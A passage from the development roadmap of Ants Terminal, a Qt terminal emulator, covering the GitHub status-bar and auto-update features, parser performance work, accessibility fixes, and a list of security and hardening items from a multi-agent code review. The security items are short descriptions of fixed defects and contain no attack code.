  `QTextEdit` → `QTextBrowser` for `scrollToAnchor` support; links
  pinned non-navigable. Locked by `tests/features/roadmap_viewer/`
  extended from 10 → 14 invariants (INV-11 extractToc shape, INV-12
  anchor-before-heading emission, INV-13 splitter+TOC+scrollToAnchor
  source-grep, INV-14 direct `QAbstractButton::clicked` Close-button
  connect).

### 🎨 GitHub-aware status bar (user requests 2026-04-27)

- ✅ **Public/Private repo badge + clickable update notifier.**
  Shipped 0.7.45. Two user requests bundled together — "Can we
  also have the status bar inform whether the repo is a public or
  a private repo?" and "Can we add an auto-update feature?". Both
  surface as small `QLabel` widgets on the status bar, both
  hide-when-not-applicable, both source GitHub state. The repo
  badge is per-tab (mirrors Roadmap button lifecycle via
  `refreshStatusBarForActiveTab` → new `refreshRepoVisibility`):
  walks the active tab's `shellCwd()` up for a `.git` ancestor,
  parses `[remote "origin"] url` from `.git/config` (handles both
  `https://github.com/owner/repo` and `git@github.com:owner/repo`
  forms), then runs `gh repo view <owner>/<repo> --json
  visibility -q .visibility`. Result is cached by repo root with
  a 10-minute TTL. The update notifier is global (one badge per
  running binary): a `QTimer` ticks every hour firing
  `checkForUpdates`, which hits
  `api.github.com/repos/milnet01/ants-terminal/releases/latest`
  via `QNetworkAccessManager`, strips the `v` from `tag_name`,
  and compares against `ANTS_VERSION` via a new pure
  `compareSemver` helper that splits on `.` and compares
  components as integers. A 5-second `singleShot` fires the first
  check on startup so the badge surfaces before the first hourly
  tick. New helpers in an anonymous namespace inside
  `mainwindow.cpp`: `findGitRepoRoot`, `parseGithubOriginSlug`,
  `compareSemver`. Locked by `tests/features/github_status_bar/`
  (12 invariants — label declaration/construction/object-name/
  hidden-default state, helper presence, both URL-form handling,
  `refreshStatusBarForActiveTab` wiring, four hide-on-failure
  branches in `refreshRepoVisibility`, the 10-minute cache TTL,
  the minimal `gh` invocation, the 60-min timer + 5 s singleShot,
  the releases/latest URL + User-Agent header,
  `setOpenExternalLinks(true)`, component-wise integer
  comparison in `compareSemver`). **Out of scope for this release:
  the actual binary auto-update via AppImageUpdate / zsync** — a
  follow-up release that needs the build workflow to publish a
  `.zsync` sidecar and embed the `gh-releases-zsync|...`
  update-information string in linuxdeploy. Cannot retroactively
  update binaries shipped without the metadata. This release only
  notifies.
- ✅ **Update check cadence + pre-update warning dialog.**
  Shipped 0.7.47. Two pieces of user feedback 2026-04-27 bundled:
  (1) "An hourly check I think is a bit much. Let's do the check
  when the terminal is opened and when the user clicked on
  Help > Check for Updates." (2) "Before an update is processed,
  it should warn the user that it will be restarting the
  terminal. Any Claude Code sessions currently running will need
  to be reconnected." Cadence: removed `m_updateCheckTimer` (the
  hourly `QTimer`); kept the 5-second startup `singleShot`;
  added `Help → Check for Updates` action (objectName
  `helpCheckForUpdatesAction`) for manual re-check.
  `checkForUpdates(bool userInitiated = false)` — manual triggers
  surface "Up to date — running v0.7.47 (latest)" / "Update check
  failed: <err>" status messages, startup probes stay silent.
  Pre-update dialog: `handleUpdateClicked` now constructs a
  `QMessageBox` *before* `QProcess::startDetached` explaining
  that AppImageUpdate writes the new release alongside, that the
  user must quit and re-launch to use it, and that active Claude
  Code sessions will be disconnected and need to be reconnected.
  Cancel short-circuits the spawn. Locked by
  `tests/features/github_status_bar/` extended 16 → 17
  invariants. INV-9 revised, INV-17 added.
- ✅ **AppImageUpdate / zsync auto-update.** Shipped 0.7.46.
  Phase B of the auto-update story (Phase A was the notifier in
  0.7.45). Two changes: (1) `.github/workflows/release.yml` now
  passes
  `UPDATE_INFORMATION="gh-releases-zsync|milnet01|ants-terminal|latest|Ants_Terminal-*-x86_64.AppImage.zsync"`
  to the linuxdeploy invocation, which embeds the update-info ELF
  note into the AppImage AND produces a `<output>.zsync` sidecar
  alongside it; the upload step uploads BOTH to the release.
  (2) `MainWindow::handleUpdateClicked` is now wired to the update
  label's `linkActivated` signal (`setOpenExternalLinks(false)`).
  It probes for `AppImageUpdate` (GUI) first, `appimageupdatetool`
  (CLI) second; reads `$APPIMAGE` to find the on-disk path; runs
  the updater detached via `QProcess::startDetached`. Falls back
  to `QDesktopServices::openUrl` only when neither tool is
  installed or the binary isn't running as an AppImage. v0.7.46
  is the **first release whose binary can be updated in place** —
  v0.7.45 and earlier shipped without the metadata and continue
  to be manual-download only (no way to retroactively add the ELF
  note). Test contract extended from 12 → 16 invariants in
  `tests/features/github_status_bar/` (INV-13 workflow embeds
  UPDATE_INFORMATION, INV-14 uploads `.zsync` sidecar, INV-15
  handler probes both updater names + reads `$APPIMAGE` + falls
  back to QDesktopServices, INV-16 detached spawn via
  `QProcess::startDetached`).

### 🐜 Tab UX

- ✅ **Tab close button (×) always visible, not hover-only.**
  Shipped 0.7.32. Replaced the platform-style fallback (0.6.27)
  with explicit data-URI SVG `image: url(...)` rules in both the
  default and `:hover` `QTabBar::close-button` stylesheet
  variants. Glyph re-tints with the active theme via
  `theme.textSecondary` (default) / `theme.textPrimary` (hover);
  hover keeps the ansi-red `background-color` will-click cue.
  Locked by `tests/features/tab_close_button_visible/` — 11
  invariants on data-URI presence, two-line × shape, the
  `QStringLiteral("%23") + name().mid(1)` arg-side splice (which
  prevents Qt's CSS parser from truncating the URI at the
  fragment delimiter), and image presence in BOTH state rules.
  User feedback 2026-04-25.

### ⚡ / 🏗 Tier 3 — structural

- ✅ **VtParser `Print`-run coalescing.** Shipped 0.7.17. The SIMD
  fast-path now emits one `VtAction::Print` per safe-ASCII run
  carrying a `{printRun, printRunLen}` slice into the caller buffer.
  `TerminalGrid::handleAsciiPrintRun` batches per-row cell writes so
  `markScreenDirty`, combining-char erase, and the `cell()` clamp
  fire once per row instead of once per byte. Measured deltas on
  8 MiB bench corpora (lower is better): `ascii_print` 327 → 260 ms
  (−20% wall, +26% MB/s), `ansi_sgr` 291 → 255 ms (−12% wall, +14%
  MB/s). The ROADMAP-target 5–10× never materialized because the
  remaining per-byte cost is in the cell-write path
  (`memmove`-style row updates, scrollback, attribute assignment),
  not in VtAction construction. `newline_stream` and `utf8_cjk`
  unchanged — no safe-ASCII runs or no coalesce-applicable path.
  Lifetime invariant enforced: `VtStream::onPtyData` expands runs
  into per-byte Prints before queuing (batch outlives feed buffer);
  the direct-callback path keeps the coalesced form. Locked by
  `tests/features/vtparser_print_run_coalesce` (8 invariants over
  grid-state equivalence vs. the scalar byte-by-byte feed).
- ✅ **Scroll region perf: `std::rotate` for `scrollUp`/`scrollDown`.**
  Shipped 0.7.40. `TerminalGrid::scrollUp` and `scrollDown`
  replaced their per-iteration `erase`+`insert` loop with a single
  `std::rotate` call over `[scrollTop, scrollBottom]` plus a
  pool-salvage / scrollback-push pre-pass and a fresh-blank
  post-pass. The CSI 2J doubling-guard window check moves from
  per-iteration to once-per-batch (elapsed time is microseconds
  across the batch — same observable behaviour). Hyperlinks rotate
  with the rows; scrollback cap pop_front loops once at the end of
  the batch instead of N times. `CSI 100 S` on an 80-row screen
  drops from O(count × rows) memmoves to O(rows). All eight
  invariants in `tests/features/scroll_region_rotate/` stay green
  (rotation behaviour was already pinned by the spec; this commit
  was an algorithm swap behind that contract).
- ✅ **`VtBatch` zero-copy across thread hop.** Shipped 0.7.40.
  Introduced `using VtBatchPtr = std::shared_ptr<const VtBatch>;`
  and changed `VtStream::batchReady` from `void(const VtBatch &)`
  to `void(VtBatchPtr)`. `flushBatch` and `onPtyFinished` build
  the batch via `std::make_shared<VtBatch>()` and emit the
  smart-pointer; Qt's queued connection now copies a 16-byte
  shared_ptr (atomic refcount bump) across the worker→GUI hop
  instead of deep-copying the `actions` vector + `rawBytes`
  QByteArray (tens of KB per batch on noisy bursts × hundreds
  of batches/sec). `TerminalWidget::onVtBatch` updated to
  pointer-deref. Behavioural equivalence preserved — the
  `threaded_parse_equivalence` test (action-stream identity)
  stays green. Locked additionally by
  `tests/features/vtbatch_zero_copy/` (5 source-grep invariants
  on the carrier shape, alias declaration, make_shared emit
  sites, pointer-deref receiver, and metatype registration).
- ✅ **Renderer subsystem decision: deleted glrenderer.cpp.** Shipped
  0.7.44. The dormant GPU-accelerated glyph-atlas renderer
  (`src/glrenderer.{h,cpp}`, ~900 LoC) had been compiled-but-
  unreachable since 0.7.4 — `TerminalWidget` switched to a plain
  `QWidget` that paints via `QPainter`, leaving the GL-atlas path
  with no live caller. Reviving via `createWindowContainer` would
  have required fixing the GlyphQuad UV-math bug, restoring GL
  state on render exit, HiDPI / `devicePixelRatio` handling, and a
  premultiplied-alpha pipeline — none of which paid for themselves
  while the QPainter+QTextLayout path remained fast enough for
  every shipped corpus. Resolution: delete. Removed
  `src/glrenderer.{h,cpp}`, the `gpu_rendering` Config key, the
  `Config::gpuRendering` / `setGpuRendering` getters/setters, the
  Settings → Appearance "GPU rendering (glyph atlas + GLSL
  shaders)" checkbox, the View → "GPU Rendering" menu action, the
  `m_glRenderer` / `m_gpuRendering` members on `TerminalWidget`,
  and the `setGpuRendering(bool)` / `gpuRendering()` accessors.
  Settings-restore-defaults spec updated to drop the no-longer-
  present `gpuRendering off` clause. Existing config files with a
  stale `gpu_rendering: true` key are silently ignored — Config
  doesn't validate unknown keys. User-visible payoff: the
  Settings checkbox + View menu item used to write the bool but
  do nothing; both are gone, so the chrome no longer lies about
  its own functionality.
- ✅ **Settings dialog: dependency-UI enable gating.** Shipped
  0.7.32. AI tab fields (endpoint/key/model/context-lines)
  disabled when `m_aiEnabled` is unchecked; dark/light theme
  combos disabled when `m_autoColorScheme` is unchecked; Quake
  hotkey + portal-status label disabled when `m_quakeMode` is
  unchecked. Locked by `tests/features/settings_dependency_gating/`
  — 16 invariants on toggled-wiring + one-shot sync calls.
- ✅ **Settings dialog: Cancel rollback for Profiles tab.**
  Shipped 0.7.32. Profile Save/Delete/Load now stage edits in
  `m_pendingProfiles` + `m_pendingActiveProfile`; `applySettings`
  is the single commit point. Cancel discards staged edits the
  same way every other tab does. Locked by
  `tests/features/settings_profile_cancel_rollback/` — 11
  invariants including the global "single setProfiles call site"
  check that catches a regression where a Save/Delete callback
  starts writing to m_config directly again.
- ✅ **Settings dialog: Restore Defaults per-tab.** Shipped
  0.7.32. Each primary tab (General, Appearance, Terminal, AI)
  has a "Restore Defaults (<TabName> tab)" button with stable
  objectName. Reset slots mutate widgets only — Cancel rolls
  back the reset along with any other in-dialog edits. Locked
  by `tests/features/settings_restore_defaults/` — 22
  invariants on objectNames + reset-value coverage + no-direct-
  config-write.
- ✅ **Accessibility pass on chrome.** Shipped 0.7.41. Every
  glyph-only chrome control now carries an explicit
  `setAccessibleName` + `setAccessibleDescription` set immediately
  after `setText`. TitleBar's four window controls (`centerBtn`
  "Center window", `minimizeBtn` "Minimize window", `maximizeBtn`
  "Maximize window", `closeBtn` "Close window") and the
  CommandPalette's two controls (`commandPaletteInput`
  "Command palette search", `commandPaletteList`
  "Command palette results") are covered. Status-bar push buttons
  with English labels (`Background Tasks`, `Roadmap`,
  `Review Changes`) are out of scope: they inherit their accessible
  name from `text()` via Qt's `QAccessibleButton` adapter.
  `tr()` translation hooks deferred to 0.9.0 H10 i18n bundle so
  `.qm` files cover both UI text and a11y strings in one pass. Locked
  by `tests/features/a11y_chrome_names/` (eight invariants).
- ✅ **AT-SPI introspection lane.** Shipped 0.7.41 as part of the
  same bundle. `tests/features/a11y_chrome_names/` walks the
  TitleBar + CommandPalette widget trees under
  `QT_QPA_PLATFORM=offscreen` and asserts every reachable
  `QAbstractButton` carries either a non-empty `accessibleName()`
  or a non-empty `text()`, and every reachable `QLineEdit` has an
  explicit `accessibleName()`. A future contributor adding a
  glyph-only chrome button without a name fails this test. Custom
  `QAccessibleInterface` for `TerminalWidget` (the H9 a11y bundle)
  remains separate, target 0.9.0.

### 📚 Sweep methodology — re-run before each minor tag

Adopt the following as a standing pre-release step:

1. Re-dispatch the 14-agent sweep via
   `general-purpose` subagents (one per subsystem listed in
   `CLAUDE.md`'s "Project Structure"), briefed with source paths +
   `CLAUDE.md` + `PLUGINS.md` + matching `tests/features/*/spec.md` +
   relevant external specs. Cost: ~15 subagent runs (~1 M tokens total
   for a full sweep).
2. Triage the HIGH/Medium findings into this ROADMAP under the active
   minor's section.
3. Anchor every regression test added during the fix cycle to an
   **external** signal (spec section, CVE, reviewer report), not the
   author's own reasoning. See the "Spec-first workflow" note below.

**Spec-first workflow for new features (starting with the first
Tier 1 fix):** write `tests/features/<name>/spec.md` *before* the
code, surface it to the user for sign-off, then implement. The
feature test validates the user-approved spec, not the author's
interpretation. Closes the self-graded-homework loop.

### 🧪 Future external-signal lanes (carry from the 2026-04-23 review)

- 📋 [ANTS-1003] **vttest as a CI lane.** Thomas Dickey's public xterm test
  program. Highest signal-per-effort for VT conformance drift.
  Runs a canonical xterm-compliance corpus against our parser; any
  divergence is a finding anchored to a published spec.
  Kind: implement.
- 📋 [ANTS-1004] **Differential screen-dump harness vs xterm/kitty.** Send a
  canonical byte-stream corpus to each, capture final screen state,
  diff. Divergences are findings regardless of what our unit tests
  say.
  Kind: implement.
- 📋 [ANTS-1005] **libFuzzer target against `VtParser`.** Feed random bytes,
  assert invariants (no crash, cursor bounded, scrollback bounded,
  combining side-table aligned). Mechanical — surfaces cases the
  author can't imagine.
  Kind: implement.
- 📋 [ANTS-1006] **Real-TUI smoke lane.** `vim`, `tmux`, `htop`, `neovim` in a
  headless session, snapshot screen, compare across releases.
  Kind: implement.

## 0.7.50–0.7.59 — indie-review sweep + companion prep — shipped 2026-04-28+ (in flight at 0.7.59)

**Theme:** fold-in of the 2026-04-27 multi-agent code review (post-0.7.49).
Eleven independent `general-purpose` subagents dispatched in parallel —
one per subsystem — each briefed only with source paths + contract docs +
external standards (ECMA-48, xterm ctlseqs, POSIX `forkpty(3)`, Lua 5.4
manual, OWASP LLM Top 10, SARIF v2.1.0, RFC 8259, freedesktop GlobalShortcuts
portal, WCAG 2.2). Agents had **zero context on implementation reasoning** —
code reviewed against contracts, not intent.

The sweep produced 14 CRITICAL/HIGH cross-cutting findings plus ~40 medium
hardening items. The cross-cutting themes are the gold signal — patterns
flagged by ≥2 independent reviewers regardless of which lane:

### 🔥 Cross-cutting themes (≥2 reviewers)

- ✅ [ANTS-1007] **Atomic-write / data-loss drift.** The `QFile::rename` anti-pattern
  Config retired once is unfixed in `SessionManager::saveSession` +
  `saveTabOrder` and in the `auditdialog.cpp` SARIF/HTML export.
  Closed by ANTS-1016 (`sessionmanager.cpp:403, 481` switched to
  `std::rename` for both `saveSession` and the tab-order writer) and
  ANTS-1017 (`auditdialog.cpp:3539` plus the trend / baseline /
  suppress sibling sites all migrated to `QSaveFile` with
  `setOwnerOnlyPerms`).
  Lanes: Config, Audit.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1008] **frameless+translucent `exec()` regression class is back.**
  0.7.49 retired this for both About dialogs; the 0.7.47
  update-confirmation `QMessageBox box(this); box.exec()` reintroduces
  the same shape on the same MainWindow. Closed by ANTS-1015
  (shipped 0.7.52 — `mainwindow.cpp:5405` heap+`WA_DeleteOnClose`+
  `show()`+`raise()`+`activateWindow()` mirroring the About-dialog
  pattern). Lanes: MainWindow, AI/dialogs.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1009] **Missing argv `--` separator / quote-aware tokenisation.**
  `git blame -- f.file` separator missing, ssh `extraArgs` quote-bypass
  on `-o` allowlist, `openFileAtPath` doesn't `--`-separate captured
  paths starting with `-`. Closed by ANTS-1024 (ssh quote-bypass —
  `sshdialog.cpp:113` uses `QProcess::splitCommand`), ANTS-1028
  (`openFileAtPath` argv injection — `terminalwidget.cpp:3337`
  prepends `./` to dash-leading paths), and ANTS-1030 (`git blame`
  `--` terminator was already in by the time the review ran;
  `auditdialog.cpp:2497`). Lanes: Audit, AI/dialogs, TerminalWidget.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1010] **Permission allow-list / intersect missing.** Lua plugin
  manifest accepts any permission string, prompt result not
  intersected with requested set. SSH `-o` allowlist same shape.
  Closed by ANTS-1022 (Lua permission allow-list + intersect at
  `pluginmanager.cpp:82, 270`) and ANTS-1024 (ssh `-o` allowlist
  via `QProcess::splitCommand` quote-aware tokens).
  Lanes: Lua, AI/dialogs.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1011] **Color-only state encoding (WCAG 1.4.1).** Per-tab Claude state
  dot, status-bar Claude label, chrome QLabels — no shape variation,
  no `accessibleDescription`. Closed by ANTS-1034 (per-tab tooltip
  carries the textual state — Orca-readable WCAG 1.4.1 equivalent),
  ANTS-1035 (`mainwindow.cpp:593, 3520, 3699` add
  `setAccessibleName` and dynamic `setAccessibleDescription` for
  branch chip, repo-visibility, process, and Claude state labels),
  and ANTS-1041 (`ToggleSwitch` accessibility plumbing via
  `QAccessibleEvent(StateChanged)`).
  Lanes: Chrome widgets, Claude integration, MainWindow.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1012] **Unbounded reads / OOM corner cases.** `extractCwdFromTranscript`
  unbounded `readLine`, AI SSE parser blocks event loop on big chunks,
  Roadmap dialog reads entire file unbounded. Closed by ANTS-1023
  (`claudeintegration.cpp:1001` caps `readLine` at 64 KiB),
  ANTS-1038 (`aidialog.cpp:287` caps per-tick SSE drain and re-arms
  via `singleShot(0)`), and the 2026-04-30 fold-in of the
  RoadmapDialog gap — `roadmapdialog.cpp:929` now reads at most
  8 MiB, capping a malicious or symlinked ROADMAP.md. Lanes: Claude
  integration, AI/dialogs, RoadmapDialog.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1013] **2 s status-timer redundant work.** 0.7.49 bg-tasks fix forces
  full 16 MiB transcript reparse every tick on a quiet session;
  `refreshReviewButton` spawns `git status` `QProcess` every 2 s with
  no in-flight de-dup. Closed by ANTS-1033 (bg-tasks split —
  `claudebgtasks.cpp:51` `sweepLiveness()` on the timer, full
  rescan only on file-change) and the 2026-04-30 fold-in of the
  refreshReviewButton gap — `MainWindow::m_reviewProbeInFlight`
  guards against overlapping `git status --porcelain=v1 -b` probes
  on slow filesystems / pathologically large repos. Lanes: Claude
  integration, MainWindow.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- 📋 [ANTS-1014] **No clipboard-write redaction helper.** 7th-audit memory flagged
  this; TerminalWidget has 12 raw `setText` sites. OSC 52 callback is
  the headline exfil vector. Lanes: TerminalWidget.
  Kind: review-fix.

### 🐛 Regressions reported post-0.7.49 (user, 2026-04-27)

- ✅ **HIGH — GitHub repo-type chip (Public/Private) not showing
  at all.** Resolved as of 2026-04-28 (user confirmed via screenshot
  showing the "Public" badge alongside the `main` branch chip on the
  status bar's left side). The chip became visible after the 0.7.50
  / 0.7.51 release cycle landed; the original suspicion (placement-
  move regression hiding the widget) didn't manifest in the running
  build once chrome ordering settled. No source change needed beyond
  what already shipped. `tests/features/github_status_bar/` still
  asserts the call shape but does not check runtime visibility —
  worth extending the next time the GitHub-status-bar lane is
  touched (deferred to T2 hardening, separate item).
- ✅ **HIGH — Status-bar transient notification stuck on "Config
  reloaded from disk".** Shipped in 0.7.51 — root cause was the
  config-watcher firing in a tight loop (the second of the two
  hypotheses in the original entry). `Config::setTheme` rewrote the
  watched file even when the value matched, so any
  `applyTheme(m_config.theme())` from inside `onConfigFileChanged`
  re-entered via inotify after `blockSignals(false)` released. Fix
  made `setTheme` idempotent + added an `m_inConfigReload` re-entrancy
  guard with deferred clear via `QTimer::singleShot(0, ...)`. See
  CHANGELOG 0.7.51 and `tests/features/config_reload_loop_safety/`.

### 🔒 Tier 1 — ship-this-week (security / data-loss / shipped-broken)

All Tier 1 items shipped between 0.7.52 and 0.7.53 — see CHANGELOG
sections of those releases for the inline narrative. Source comments
in each named file carry the original indie-review citation.

- ✅ [ANTS-1015] **CRITICAL — Update-confirmation dialog same KDE/KWin frameless
  regression.** Shipped 0.7.52 — `mainwindow.cpp:5405` converted to
  heap+`WA_DeleteOnClose`+`show()`+`raise()`+`activateWindow()`,
  mirroring the 0.7.49 About-dialog pattern.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1016] **CRITICAL — SessionManager silent data loss.** Shipped
  0.7.52 — `sessionmanager.cpp:392, 476` switched to `std::rename`
  (POSIX overwrite semantics) for `saveSession` and the tab-order
  writer. Comment cites the 0.7.52 indie-review CRITICAL tag.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1017] **CRITICAL — SARIF/HTML export not atomic + no 0600 perms.**
  Shipped 0.7.52 — `auditdialog.cpp:3539` switched to `QSaveFile` plus
  `setOwnerOnlyPerms`. Multiple sibling sites (trend, baseline,
  suppress) also migrated to QSaveFile in the same pass.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1018] **HIGH — `new-tab` / `launch` IPC commands bypass `send-text` C0
  filter.** Shipped 0.7.52 — `remotecontrol.cpp:393, 442` route
  `command` through `filterControlChars` with the same `raw: true`
  opt-out as `send-text`.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1019] **HIGH — OSC 8 `file://` scheme in allowlist.** Shipped
  0.7.52 — `terminalgrid.cpp:940` drops `file:` and `ftp:` from the
  allowlist; legitimate `xdg-open` paths now go via the file-path
  span machinery, not OSC 8.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1020] **HIGH — ESC-in-OSC dispatches trailing byte as EscDispatch.**
  Shipped 0.7.53 — `vtparser.cpp:417` adds `OscStringEsc` peek state
  matching xterm's parser; the trailing byte is now consumed and
  discarded.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1021] **HIGH — X10 mouse byte > 0xDF corrupts UTF-8 stream.**
  Shipped 0.7.53 — `terminalwidget.cpp:1835` clamps `col`/`row` to
  223 in the X10 path (and the 2737 wheel-encoder mirror site).
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1022] **HIGH — Lua plugin permission allow-list + intersect missing.**
  Shipped 0.7.53 — `pluginmanager.cpp:82` adds the canonical
  allow-list (`clipboard.write`, `settings`); line 270 intersects the
  user's prompt return with the manifest's declared set.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1023] **HIGH — `extractCwdFromTranscript` unbounded `readLine`.**
  Shipped 0.7.52 — `claudeintegration.cpp:1001` caps `readLine` at
  64 KiB. Removes the 1 GiB single-line OOM corner case.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1024] **HIGH — ssh `extraArgs` quote-bypass on `-o` allowlist.**
  Shipped 0.7.52 — `sshdialog.cpp:113` replaces `split(\\s+)` with
  `QProcess::splitCommand`; the option allowlist now sees genuine
  tokens (`-o "ProxyCommand …"` arrives as a single one).
  Kind: review-fix.
  Source: indie-review-2026-04-27.

### 🔧 Tier 2 — hardening sweep

All Tier 2 items shipped between 0.7.53 and 0.7.57. Source comments
in each named file carry the original indie-review citation.

- ✅ [ANTS-1025] **Multi-row OSC 8 hyperlink span miscoded.** Shipped
  0.7.55 — `terminalgrid.cpp:866` emits per-row spans on newline /
  wrap during the active hyperlink.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1026] **ITU/ECMA-48 colon-RGB form `38:2::r:g:b`.** Shipped
  0.7.55 — `terminalgrid.cpp:1503` documents the supported forms,
  parser tracks the colonSep slot. See `terminalgrid.h:384`.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1027] **Image-paste `m_imagePasteDir` not path-validated; filename
  injected to PTY.** Shipped 0.7.53 — `terminalwidget.cpp:1441` adds
  the canonicalize-and-reject-non-writable guard plus a UUID4 suffix
  on the saved filename.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1028] **`openFileAtPath` argv injection.** Shipped 0.7.52 —
  `terminalwidget.cpp:3337` prepends `./` to any captured path that
  starts with `-`, so VS Code/etc see a literal path token, not a
  flag.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1029] **Paste preview splits on LF only — CR-only payload spoofs
  the dialog.** Shipped 0.7.53 — `terminalwidget.cpp:2105` normalizes
  CR→LF for the preview only; the actual write keeps original bytes.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1030] **`git blame` missing `--` argv terminator.** Shipped
  pre-0.7.55 — `auditdialog.cpp:2497` already passes `--` between
  `HEAD` and the scanner-supplied `f.file`.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1031] **comment-suppress regex breaks on hyphenated rule IDs.**
  Shipped 0.7.55 — `auditdialog.cpp:2269` replaces the terminator
  class with `[)\]]|$` so hyphens in rule IDs no longer terminate
  the match early.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1032] **Trend snapshot corrupted by UI filter clicks.**
  Shipped 0.7.55 — `auditdialog.cpp:4481` adds the
  `m_snapshotPersisted` re-entry guard so severity-pill toggles
  re-render without re-appending snapshots.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1033] **bg-tasks: split liveness from full reparse.** Shipped
  0.7.55 — `claudebgtasks.cpp:51` adds `sweepLiveness()`,
  `mainwindow.cpp:5059` calls it on the 2 s status timer; the file
  watcher continues to call full `rescan`. 16 MiB reparse per tick
  retired.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1034] **WCAG 1.4.1 — Claude state dot is colour-only.**
  Shipped 0.7.57 — coverage exists via the existing
  `setTabToolTip` path: `mainwindow.cpp:3683` already wires the per-
  tab tooltip to a state-aware label ("Claude: idle",
  "Claude: thinking…", "Claude: bash", "Claude: planning",
  "Claude: auditing", "Claude: awaiting input"). Linux screen
  readers (Orca) read tooltips on hover-and-focus, providing the
  WCAG 1.4.1 textual equivalent. Note: per-tab `setTabAccessibleName`
  isn't exposed by Qt 6.11's QTabBar (only added in some 6.5+
  builds), so the tooltip path is the most portable a11y carrier.
  Shape variation per state is deferred — would conflict with the
  0.7.39 spec (`claude_state_dot_palette/spec.md`) which explicitly
  forbids per-state shape/outline variation.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1035] **A11y — status-bar QLabels missing `setAccessibleName`.**
  Shipped 0.7.54 — `mainwindow.cpp:593, 3520, 3699` wire
  `setAccessibleName` and dynamic `setAccessibleDescription` for the
  branch chip, repo-visibility, process, and Claude state labels.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1036] **`ClaudeBgTaskTracker::tasks()` returns by value on hot path.**
  Shipped 0.7.55 — `claudebgtasks.h:56` returns by const reference.
  Same cppcheck `returnByReference` class swept across 7 more hot
  getters in 0.7.57.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1037] **Endpoint scheme allowlist on `ai_endpoint`.** Shipped
  0.7.52 — `aidialog.cpp:118` rejects anything other than
  `http`/`https` at config-load time, with a UI-visible failure
  message.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1038] **AI SSE parser cap iterations + re-arm via `singleShot(0)`.**
  Shipped 0.7.54 — `aidialog.cpp:287` caps the per-tick drain and
  re-arms via `singleShot(0)` when the buffer is non-empty. Stops
  the UI freeze on misbehaving SSE endpoints.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1039] **Bracketed-paste 8-bit C1 form `\x9B[200~` not stripped.**
  Shipped 0.7.53 — `terminalwidget.cpp:2231` strips both UTF-8-
  encoded and raw single-byte C1 forms in addition to the 7-bit ESC
  form.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1040] **Plan-mode reset on tab switch loses latched state.**
  Shipped 0.7.54 — `claudeintegration.cpp:68` adds the per-shellPid
  plan-mode cache; tab switches re-derive from the cache rather
  than clearing the latch.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1041] **`ToggleSwitch` accessibility plumbing missing.** Shipped
  0.7.54 — `toggleswitch.cpp:21` adds `setAccessibleName` and
  `QAccessibleEvent(StateChanged)` on every `setChecked` flip.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1042] **`extraArgs` parsing for IPv6 in Quick Connect.** Shipped
  0.7.54 — `sshdialog.cpp:334` detects `[…]` brackets per RFC 3986
  §3.2.2 and parses the bracketed body as the host before splitting
  on `:port`.
  Kind: review-fix.
  Source: indie-review-2026-04-27.

### 🏗 Tier 3 — structural

- 📋 [ANTS-1043] **`mainwindow.cpp` decomposition (6162 LoC).** Extract
  `RepoStatusController` (git/origin/visibility/update helpers,
  ~280 LoC), diff-viewer dialog (`showDiffViewer` and friends,
  ~430 LoC), Claude permission-prompt slot (~160 LoC of nested
  lambdas). ~860 LoC carved off without cross-cutting state.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- 📋 [ANTS-1044] **`auditdialog.cpp` decomposition (5749 LoC).** `populateChecks`
  data table → `auditcatalogue.cpp`; SARIF/HTML export →
  `auditexport.cpp`; embedded sh fragments (e.g. line 444-460,
  567-580) → `packaging/check-*.sh` mirroring the version-drift
  pattern. ~1900 LoC carved off.
  Kind: review-fix.
  Source: indie-review-2026-04-27.
- ✅ [ANTS-1045] **`XcbPositionTracker` rename + Wayland-non-KWin abort + temp-
  file leak fix.** Shipped 2026-04-30 (post-0.7.60). Class +
  files renamed to `KWinPositionTracker` /
  `kwinpositiontracker.{h,cpp}`. KWin-presence guard checks
  `KDE_FULL_SESSION=true` OR `XDG_CURRENT_DESKTOP` containing
  `KDE` (XDG_SESSION_TYPE alone was insufficient — KWin runs on
  both X11 and Wayland). Temp-file leak fixed via
